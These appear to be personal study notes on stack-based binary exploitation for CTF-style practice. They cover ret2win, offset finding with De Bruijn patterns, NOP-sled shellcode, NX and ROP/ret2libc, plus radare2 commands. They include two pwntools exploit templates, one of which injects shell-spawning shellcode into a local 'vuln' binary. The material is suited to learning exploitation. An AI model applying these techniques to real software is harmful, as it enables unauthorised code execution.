Resource (ir0nstone)

===Stack==
- Region of memory storing temporary variables created by functions in code.
- Function called -> Memory address pushed into stack. 

Radare2 (Binary reverse-engineering and analysis tool)
r2 -d -A vuln | -d = Runs -A = Analysis
s main; pdf | [s] Seek main, [pdf] Print Disassembly Function
pxw @ esp | Stack view
dr <register> | Show register
EIP (Extended Instruction Pointer) | Points to next instruction

ret2win
1) Identify minimum Offset/padding 
Padding | Offset/padding to cause segmentation fault
2) Target function/memory address
afl (Command) | Analyse Functions List (List functions of binary). 
      - Identify target function to execute and using its associated memory address.
3) Prepare (Overwrite saved return pointer/address that will popped into EIP) 
Overflow and give EIP target memory address.
===============================================================================================
from pwn import *            # pwntools Import

p = process('./vuln')        # Start process

payload = b'A' * 52          # String to bytes because of next line
payload += p32(<<Memory Address>>)   # Target memory address (p32 function returns bytes) - Endianness

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output target string.
===============================================================================================

De Bruijn Sequences (Offset Calculations)
"ragg2 -P 100 -r" generates pattern of length 100 in ascii bytes.
Sequence added when prompted for input and receive address program crashes at.
wopO <Memory Address> | Provides offset.

Shellcode
- Running own instructions
Von Neumann architecture | No differentiation between data and instructions
1) Identify buffer start in memory by inspecting vulnerable function. Example: ; var int32_t var_134h @ ebp-0x134 (Local variable)
2) Add items to buffer and inspect local variable to check whether input is stored there.
px @ ebp-0x134 | Inspect local variable.
3) De Bruijn sequence to find padding (ragg2 -P X -r then wopO `dr eip` or wopO <Memory Address>).

===============================================================================================
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = asm(shellcraft.sh())           / Shellcode
payload = payload.ljust(312, b'A')       / Padding 
payload += p32(<<Memory Address>>)       / Target memory 

log.info(p.clean())
p.sendline(payload)
p.interactive()
===============================================================================================

NOPs (No operation) Instructions / NOP Sliding
- Removes requirement for attack to jump to a specific address (Example: Overcomes stack randomization)
- Makes target address larger (Target anywhere in the NOPs padding which eventually directs to specific address)
- "In intel x86 assembly, NOP instructions are \x90"
===============================================================================================
b'\x90\x90\x90\x90\x90...<Shellcode><Padding><Memory Address>
===============================================================================================
Stack View:
===================================================================================================================
=        |\x90\x90\x90\x90\x90\x90\x<Shellcode>|<Padding>| <Memory Address> |         |       |                   =
=  Data  |    BUFFER (NOP Slide + Shellcode)   |   EBP   |  RETURN Address  |   ARG   |  ARG  |  Calling Function = 
===================================================================================================================

32- vs 64-bit
p32() -> p64()
32-bit: Parameters pushed to stack before function called.
64-bit: First 6 stored in registers (RDI, RSI, RDX, RCX, R8 and R9 )
x86 calling conventions

No eXecute
NX bit (No-execute): Technology to segregate areas of memory (virtual address space)
Technique: Return-Oriented Programming (ROP)

[Practical] Checking for NX bit:
"rabin2 -I <File>"

Return-Oriented Programming (ROP)
- "Chaining small snippets of code already present within the binary to perform more complex activities"
1) Calling Conventions
Notes: Arguments/Parameters in source code pushed to stack before function is called.
64-bit: Arguments/Parameters moved to RDI/EDI register. Mutiple args/para moved to different registers (edx, esi, edi)
[Practical] "dr rdi" | Check RDI register
2) Gadgets
3) Exploiting Calling Conventions
4) ret2libc
Notes: ret2libc based off system functon in C library that can execute anything passed to it.
       Passing "/bin/sh" to system pops open a shell.

Data Execution Prevention



===Heap===



===Kernel=== 
